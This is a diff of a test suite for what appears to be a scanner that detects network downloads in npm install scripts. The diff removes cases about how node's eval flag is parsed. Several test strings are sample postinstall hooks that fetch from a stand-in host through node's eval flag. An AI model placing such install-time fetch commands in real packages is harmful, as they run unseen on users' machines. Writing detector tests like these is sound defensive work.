@@ -395,24 +395,6 @@ describe("an install script's `npm run` is followed through quoted, escaped and 
   });
 });
 
-describe("node's inline-eval flag is recognised after a flag whose value is the next word", () => {
-  const code = "\"require('https').get('https://example.invalid/x')\"";
-  const plain = scoreOf({ scripts: { postinstall: `node -e ${code}` } }, {});
-
-  for (const cmd of [`node --conditions dev -e ${code}`, `node --redirect-warnings file -e ${code}`, `node -r ./x.js -e ${code}`, `node "--conditions" "dev" "-e" ${code}`]) {
-    test(cmd.slice(0, 40), () => {
-      const r = scoreOf({ scripts: { postinstall: cmd } }, {});
-
-      expect(r.ids).toContain("install-download");
-      expect(r.score).toBe(plain.score);
-    });
-  }
-
-  test("a program's own arguments after its path are not node's", () => {
-    expect(isInlineDownload("node install.js -e https")).toBe(false);
-  });
-});
-
 
 describe("what only the flag-aware reading adds never displaces what main's reading reaches", () => {
   test("a streamed plan with room for one file holds the direct install target, not one reached through a quoted flag", () => {
@@ -472,9 +454,6 @@ describe("the flag-aware reading's additions, round two", () => {
     });
   }
 
-  test("an eval flag after a node option with a value word the table does not list", () => {
-    expect(isInlineDownload("node --unhandled-rejections strict -e \"require('https').get('https://example.invalid/x')\"")).toBe(true);
-  });
 });
 
 
@@ -767,10 +746,6 @@ describe("words that only look like npm's or node's options", () => {
     expect(ids({ postinstall: "printf ready | xargs -I TARGET npm '--loglevel' warn run TARGET", TARGET: DROPPER, ready: "echo" })).not.toContain("install-download");
   });
 
-  test("node exits at --version before an eval flag after it", () => {
-    expect(isInlineDownload("node '--title' fetch --version -e 0")).toBe(false);
-    expect(isInlineDownload("node '--title' x -e \"require('https').get('https://example.invalid/x')\"")).toBe(true);
-  });
 });
 
 describe("words npm or node may not read as written", () => {
@@ -790,13 +765,5 @@ describe("node's exit flags never cost what fe2e641's eval reading finds", () =>
   test("an eval fe2e641 reads stands, and an exit flag inside the eval code is code", () => {
     expect(isInlineDownload("node '-e' 'fetch(\"data:,inline --help marker\").then(r=>r.text())'")).toBe(true);
     expect(isInlineDownload("node --version -e \"require('https').get('https://example.invalid/x')\"")).toBe(true);
-  });
-});
-
-describe("the added node reader reads the words the shell hands node", () => {
-  test("an exit option after quoted eval code with spaces, or written with a value, runs nothing", () => {
-    expect(isInlineDownload("node '--title' fetch -e 'console.log(\"MARKER HAS SPACE\")' --version")).toBe(false);
-    expect(isInlineDownload("node '--title' fetch -e 'console.log(12345)' --version=true")).toBe(false);
-    expect(isInlineDownload("node --conditions dev -e \"require('https').get('https://example.invalid/x')\"")).toBe(true);
   });
 });
